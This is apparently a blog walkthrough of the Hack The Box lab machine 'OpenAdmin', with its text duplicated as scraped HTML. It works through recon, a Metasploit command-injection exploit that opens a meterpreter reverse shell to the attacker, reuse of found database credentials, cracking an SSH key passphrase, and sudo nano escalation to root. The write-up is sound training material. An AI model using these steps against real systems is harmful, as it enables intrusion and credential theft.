/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -k -q ... /music (Status: 301) /artwork (Status: 301) /sierra (Status: 301) There’s a few places to check out but lets take a look at /music first. Mostly static pages but after much “crawling” around, I found /ona by clicking on the “Login” button only on the index page? We are presented with the UI for OpenNetAdmin. 1 OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors. From the UI, we can see that the version of OpenNetAdmin installed on the box is v18.1.1. With that knowledge, I used searchsploit to search for any possible exploit for this version. 1 2 3 4 5 6 7 8 9 10 searchsploit OpenNetAdmin 18.1.1 ----------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ----------------------------------------------------------------------------------- ---------------------------------------- OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit) | exploits/php/webapps/47772.rb OpenNetAdmin 18.1.1 - Remote Code Execution | exploits/php/webapps/47691.sh ----------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Papers: No Result I will be using the Metasploit module for this one. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ msfconsole msf5 &gt; search opennetadmin Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/webapp/opennetadmin_ping_cmd_injection 2019-11-19 excellent Yes OpenNetAdmin Ping Command Injection msf5 &gt; use exploit/unix/webapp/opennetadmin_ping_cmd_injection msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; set RHOSTS openadmin.htb RHOSTS =&gt; openadmin.htb msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; set LHOST tun0 LHOST =&gt; 10.10.XX.XX msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:4444 [*] Exploiting... [*] Command Stager progress - 100.00% done (703/703 bytes) [*] Exploit completed, but no session was created. Hmm no session? Lets use a 64-bit payload instead. 1 2 3 4 5 6 7 8 9 10 11 12 msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; set payload linux/x64/meterpreter/reverse_tcp payload =&gt; linux/x64/meterpreter/reverse_tcp msf5 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; run [*] Started reverse TCP handler on 10.10.XX.XX:4444 [*] Exploiting... [*] Sending stage (3012516 bytes) to 10.10.10.171 [*] Meterpreter session 1 opened (10.10.XX.XX:4444 -&gt; 10.10.10.171:48498) at 2020-04-30 22:45:18 -0400 [*] Command Stager progress - 100.00% done (808/808 bytes) meterpreter &gt; getuid Server username: no-user @ openadmin (uid=33, gid=33, euid=33, egid=33) Alright, we got a foothold! Lets try spawning a tty shell. 1 2 3 4 5 meterpreter &gt; shell which python which python3 python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; www-data@openadmin:/opt/ona/www$ Seems like we are in the web service’s directory. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 www-data@openadmin:/opt/ona/www$ ls -al -rw-rw-r-- 1 www-data www-data 1970 Jan 3 2018 .htaccess.example drwxrwxr-x 2 www-data www-data 4096 Jan 3 2018 config -rw-rw-r-- 1 www-data www-data 1949 Jan 3 2018 config_dnld.php -rw-rw-r-- 1 www-data www-data 4160 Jan 3 2018 dcm.php drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 images drwxrwxr-x 9 www-data www-data 4096 Jan 3 2018 include -rw-rw-r-- 1 www-data www-data 1999 Jan 3 2018 index.php drwxrwxr-x 5 www-data www-data 4096 Jan 3 2018 local -rw-rw-r-- 1 www-data www-data 4526 Jan 3 2018 login.php -rw-rw-r-- 1 www-data www-data 1106 Jan 3 2018 logout.php drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 modules drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 plugins drwxrwxr-x 2 www-data www-data 4096 Jan 3 2018 winc drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 workspace_plugins After some digging around, I only found database credentials in /opt/ona/www/local/config/database_settings.inc.php. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 $ /opt/ona/www/local/config/database_settings.inc.php &lt;?php $ona_contexts=array ( &#39;DEFAULT&#39; =&gt; array ( &#39;databases&#39; =&gt; array ( 0 =&gt; array ( &#39;db_type&#39; =&gt; &#39;mysqli&#39;, &#39;db_host&#39; =&gt; &#39;localhost&#39;, &#39;db_login&#39; =&gt; &#39;ona_sys&#39;, &#39;db_passwd&#39; =&gt; &#39;n1nj4W4rri0R!&#39;, &#39;db_database&#39; =&gt; &#39;ona_default&#39;, &#39;db_debug&#39; =&gt; false, ), ), &#39;description&#39; =&gt; &#39;Default data context&#39;, &#39;context_color&#39; =&gt; &#39;#D3DBFF&#39;, ), ); ?&gt; Moving on, I went to check what users were on the box. 1 2 3 4 5 www-data@openadmin:/opt/ona/www$ ls -al /home drwxr-xr-x 4 root root 4096 Nov 22 18:00 . drwxr-xr-x 24 root root 4096 Nov 21 13:41 .. drwxr-x--- 6 jimmy jimmy 4096 May 1 00:44 jimmy drwxr-x--- 6 joanna joanna 4096 May 1 02:43 joanna With these 2 usernames and the password I found, I manually tried each possible combination and managed to log into jimmy. 1 2 3 4 5 $ ssh jimmy@openadmin.htb jimmy@openadmin.htb&#39;s password: n1nj4W4rri0R! ... jimmy@openadmin:~$ id uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal) Unfortunately, jimmy doesn’t have the user.txt, which means that joanna has it. It was hard to figure where to go next so I did some basic enumeration and found a very interesting port 52846 that was only exposed on the localhost interface. 1 2 3 4 5 6 7 8 9 10 jimmy@openadmin:~$ netstat -peanut (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State User Inode PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN 111 20279 - tcp 0 0 127.0.0.1:52846 0.0.0.0:* LISTEN 0 20231 - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN 101 16729 - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 0 20036 - ... Lets see if we can scan this port and see what service is running on it. But first, we will need to perform SSH port forwarding to our machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ ssh -L 1337:localhost:52846 jimmy@openadmin.htb jimmy@openadmin.htb&#39;s password: n1nj4W4rri0R! $ nmap -sV -sT -sC -p 1337 127.0.0.1 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 03:31 EDT Nmap scan report for localhost (127.0.0.1) Host is up (0.000075s latency). PORT STATE SERVICE VERSION 1337/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Tutorialspoint.com Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds There’s a website on that port! Lets try visiting it using our browser. I tried with the credentials I have so far and none of them worked, so I went to check the apache2 configs to see where are the webpages being stored at. 1 2 3 4 5 6 7 jimmy@openadmin:/etc/apache2/sites-available$ ls -al total 24 drwxr-xr-x 2 root root 4096 Nov 23 17:13 . drwxr-xr-x 8 root root 4096 Nov 21 14:08 .. -rw-r--r-- 1 root root 6338 Jul 16 2019 default-ssl.conf -rw-r--r-- 1 root root 303 Nov 23 17:13 internal.conf -rw-r--r-- 1 root root 1329 Nov 22 14:24 openadmin.conf Checking each of the config, we find out that the web pages are at /var/www/internal and we also see some hints of joanna. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf Listen 127.0.0.1:52846 &lt;VirtualHost 127.0.0.1:52846&gt; ServerName internal.openadmin.htb DocumentRoot /var/www/internal &lt;IfModule mpm_itk_module&gt; AssignUserID joanna joanna &lt;/IfModule&gt; ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined &lt;/VirtualHost&gt; In the directory were 3 files. 1 2 3 4 5 6 7 jimmy@openadmin:/var/www/internal$ ls -al total 20 drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 . drwxr-xr-x 4 root root 4096 Nov 22 18:15 .. -rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php -rwxrwxr-x 1 jimmy internal 185 Nov 23 16:37 logout.php -rwxrwxr-x 1 jimmy internal 339 Nov 23 17:40 main.php In index.php, we find the code used for the login page and the username and password hash were hard-coded in it! 1 2 3 4 5 6 7 8 9 10 11 12 13 jimmy@openadmin:/var/www/internal$ cat index.php &lt;?php $msg = &#39;&#39;; if (isset($_POST[&#39;login&#39;]) &amp;&amp; !empty($_POST[&#39;username&#39;]) &amp;&amp; !empty($_POST[&#39;password&#39;])) { if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;&amp; hash(&#39;sha512&#39;,$_POST[&#39;password&#39;]) == &#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;) { $_SESSION[&#39;username&#39;] = &#39;jimmy&#39;; header(&quot;Location: /main.php&quot;); } else { $msg = &#39;Wrong username or password.&#39;; } } ?&gt; If we lookup the hash online, we get “Revealed”. Now, if we enter “jimmy” as the username and “Revealed” as the password, We got in! And we got a SSH private key? Checking the code for main.php(which was the the page we were redirected to), 1 2 3 4 5 6 7 jimmy@openadmin:/var/www/internal$ cat main.php &lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) { header(&quot;Location: /index.php&quot;); }; # Open Admin Trusted # OpenAdmin $output = shell_exec(&#39;cat /home/joanna/.ssh/id_rsa&#39;); echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; ?&gt; The private key belongs to user joanna. Lets try sshing using it. 1 2 3 4 $ chmod 700 id_rsa $ ssh -i id_rsa joanna@openadmin.htb Enter passphrase for key &#39;id_rsa&#39;: The private key is protected with a passphrase, so we use ssh2john along with john to crack the passphrase 1 2 3 4 5 6 7 8 9 10 11 12 13 $ python /usr/share/john/ssh2john.py id_rsa &gt; joanna.hash $ john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 6 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status bloodninjas (id_rsa) 1g 0:00:00:05 DONE (2020-05-01 05:12) 0.1858g/s 2665Kp/s 2665Kc/s 2665KC/s 1990..*7¡Vamos! Session completed user.txt Now, we can finally get our user.txt. 1 2 3 4 5 $ ssh -i id_rsa joanna@openadmin.htb Enter passphrase for key &#39;id_rsa&#39;: bloodninjas ... joanna@openadmin:~$ cat user.txt c9b2XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) If we list the commands we can run sudo with, 1 2 3 4 5 6 joanna@openadmin:~$ sudo -l Matching Defaults entries for joanna on openadmin: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/priv root.txt joanna can run nano as root! And according to GTFOBins, we can spawn a shell as root. Creating /opt/priv and running nano using sudo on /opt/priv: 1 2 joanna@openadmin:~$ touch /opt/priv joanna@openadmin:~$ sudo /bin/nano /opt/priv Doing Ctrl+R and Ctrl+X: Executing the magical string and getting the flag: Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/openadmin-htb/","@type":"BlogPosting","headline":"Hack The Box - OpenAdmin","dateModified":"2021-01-09T19:28:48+08:00","datePublished":"2020-05-03T10:27:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - OpenAdmin | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end">
+<div class="profile-wrapper text-center">
+<div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a>
+</div>
+<div class="site-title mt-3"> <a href="/">rizemon's blog</a>
+</div>
+<div class="site-subtitle font-italic">Cyber Security Enthusiast.</div>
+</div>
+<ul class="w-100">
+<li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a>
+</li>
+<li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a>
+</li>
+<li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a>
+</li>
+<li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a>
+</li>
+<li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a>
+</li>
+</ul>
+<div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href%20=%20'mailto:'%20+%20%5B'',''%5D.join('@')" aria-label="email" class="order-5"> <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6"> <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span>
+</div>
+</div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - OpenAdmin</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div>
+<i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel">Cancel</span>
+</div></div><div id="main-wrapper">
+<div id="main">
+<div class="row">
+<div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
+<h1 data-toc-skip>Hack The Box - OpenAdmin</h1>
+<div class="post-meta text-muted d-flex flex-column">
+<div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, May 3, 2020, 10:27 AM +0800"> May 3, 2020 <i class="unloaded">2020-05-03T10:27:00+08:00</i> </span> by <span class="author"> rizemon </span>
+</div>
+<div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Jan 9, 2021, 7:28 PM +0800"> Jan 9, 2021 <i class="unloaded">2021-01-09T19:28:48+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1923 words">10 min</span>
+</div>
+</div>
+<div class="post-content">
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/openadmin.png" alt="" height="414px" width="615px"></p>
+<h1 id="configuration">Configuration</h1>
+<p>The operating systems that I will be using to tackle this machine is a Kali Linux VM.</p>
+<p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.171 openadmin.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
+</pre></td>
+</tr></tbody></table></code></div></div>
+<h1 id="reconnaissance">Reconnaissance</h1>
+<p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> openadmin.htb
+tarting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-01-10 11:35 EST
+Nmap scan report <span class="k">for </span>openadmin.htb <span class="o">(</span>10.10.10.171<span class="o">)</span>
+Host is up <span class="o">(</span>0.46s latency<span class="o">)</span><span class="nb">.</span>                           
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http?
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>262.61 seconds
+
+</pre></td>
+</tr></tbody></table></code></div></div>
+<h1 id="enumeration-1">Enumeration (1)</h1>
+<p>Not much can be done with the <code class="language-plaintext highlighter-rouge">ssh</code> service as we do not have any credentials on hand so lets come back to it later. As for the <code class="language-plaintext highlighter-rouge">http</code> service, maybe we can find some information on it ?</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/openadmin1.png" alt=""></p>
+<p>Nothing much here so lets bruteforce some directories using <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://openadmin.htb <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt <span class="nt">-t</span> 100 <span class="nt">-k</span> <span class="nt">-q</span> 
+...
+/music <span class="o">(</span>Status: 301<span class="o">)</span>
+/artwork <span class="o">(</span>Status: 301<span class="o">)</span>
+/sierra <span class="o">(</span>Status: 301<span class="o">)</span>
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>There’s a few places to check out but lets take a look at <code class="language-plaintext highlighter-rouge">/music</code> first.</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/openadmin2.png" alt=""></p>
+<p>Mostly static pages but after much “crawling” around, I found <code class="language-plaintext highlighter-rouge">/ona</code> by clicking on the “Login” button only on the index page?</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/openadmin3.png" alt=""></p>
+<p>We are presented with the UI for <a href="https://opennetadmin.com/"><code class="language-plaintext highlighter-rouge">OpenNetAdmin</code></a>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td>
+<td class="rouge-code"><pre>OpenNetAdmin provides a database managed inventory of your IP network. Each subnet, host, and IP can be tracked via a centralized AJAX enabled web interface that can help reduce tracking errors.
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>From the UI, we can see that the version of <code class="language-plaintext highlighter-rouge">OpenNetAdmin</code> installed on the box is <code class="language-plaintext highlighter-rouge">v18.1.1</code>. With that knowledge, I used <code class="language-plaintext highlighter-rouge">searchsploit</code> to search for any possible exploit for this version.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td>
+<td class="rouge-code"><pre>searchsploit OpenNetAdmin 18.1.1
+<span class="nt">-----------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
+ Exploit Title                                                                     |  Path
+                                                                                   | <span class="o">(</span>/usr/share/exploitdb/<span class="o">)</span>
+<span class="nt">-----------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
+OpenNetAdmin 18.1.1 - Command Injection Exploit <span class="o">(</span>Metasploit<span class="o">)</span>                       | exploits/php/webapps/47772.rb
+OpenNetAdmin 18.1.1 - Remote Code Execution                                        | exploits/php/webapps/47691.sh
+<span class="nt">-----------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
+Shellcodes: No Result
+Papers: No Result
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>I will be using the <code class="language-plaintext highlighter-rouge">Metasploit</code> module for this one.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>msfconsole
+msf5 <span class="o">&gt;</span> search opennetadmin
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                                                 Disclosure Date  Rank       Check  Description</span>
+   -  <span class="nt">----</span>                                                 <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  exploit/unix/webapp/opennetadmin_ping_cmd_injection  2019-11-19       excellent  Yes    OpenNetAdmin Ping Command Injection
+
+msf5 <span class="o">&gt;</span> use  exploit/unix/webapp/opennetadmin_ping_cmd_injection
+msf5 exploit<span class="o">(</span>unix/webapp/opennetadmin_ping_cmd_injection<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS openadmin.htb
+RHOSTS <span class="o">=&gt;</span> openadmin.htb
+msf5 exploit<span class="o">(</span>unix/webapp/opennetadmin_ping_cmd_injection<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST tun0
+LHOST <span class="o">=&gt;</span> 10.10.XX.XX
